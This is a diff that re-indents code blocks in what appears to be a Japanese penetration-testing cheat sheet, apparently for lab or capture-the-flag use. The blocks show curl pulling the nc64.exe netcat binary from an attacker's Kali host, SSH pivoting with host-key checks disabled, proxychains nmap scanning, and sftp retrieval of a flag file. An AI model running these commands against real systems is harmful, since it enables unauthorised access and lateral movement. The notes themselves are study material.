@@ -85,10 +85,10 @@
 
 * curl
 
-``` shell
-    #curlでファイル転送
-    curl http://<Remote KaliのIP>:8000/nc64.exe -o nc64.exe
-```
+  ``` shell
+      #curlでファイル転送
+      curl http://<Remote KaliのIP>:8000/nc64.exe -o nc64.exe
+  ```
 
 * pythonの仮想環境
   
@@ -111,23 +111,23 @@
 
 * xfreerdp
 
-``` shell
-  xfreerdp /u:win /p:password /v:127.0.0.1
-```
+  ``` shell
+      xfreerdp /u:win /p:password /v:127.0.0.1
+  ```
 
 * ssh
 
-``` shell
-  ssh -i /home/XXX/.ssh/id_rsa <user_name>@XXX.XXX.XXX.XXX -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+  ``` shell
+    ssh -i /home/XXX/.ssh/id_rsa <user_name>@XXX.XXX.XXX.XXX -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
 
-  # port forwarding
-  ssh -N -L <localport>:<remoteXXX.XXX.XXX.XXX>:<remote_port> <踏み台user>@<踏み台XXX.XXX.XXX.XXX.>
-  
-  # dynamic port forwarding
-  ssh -fND 127.0.0.1:8080
-  #proxy経由でターゲットへのnmapスキャン
-  proxychains nmap -top-ports=20 -sT -Pn XXX.XX.XXX.XXX
-```
+    # port forwarding
+    ssh -N -L <localport>:<remoteXXX.XXX.XXX.XXX>:<remote_port> <踏み台user>@<踏み台XXX.XXX.XXX.XXX.>
+    
+    # dynamic port forwarding
+    ssh -fND 127.0.0.1:8080
+    #proxy経由でターゲットへのnmapスキャン
+    proxychains nmap -top-ports=20 -sT -Pn XXX.XX.XXX.XXX
+  ```
 
 * cron
 
@@ -140,9 +140,9 @@
 
 * sftp
   
-``` shell
-    # sftp -i <秘密鍵> -P 8080 <ユーザ>@localhost
-    sftp -i /home/kali/id_rsa -P 8080 testuser@localhost
-    #接続後 ファイルを自分の端末に転送
-    get /C:/Users/testuser/Desktop/Pentest/flag.txt
-```
+  ``` shell
+      # sftp -i <秘密鍵> -P 8080 <ユーザ>@localhost
+      sftp -i /home/kali/id_rsa -P 8080 testuser@localhost
+      #接続後 ファイルを自分の端末に転送
+      get /C:/Users/testuser/Desktop/Pentest/flag.txt
+  ```
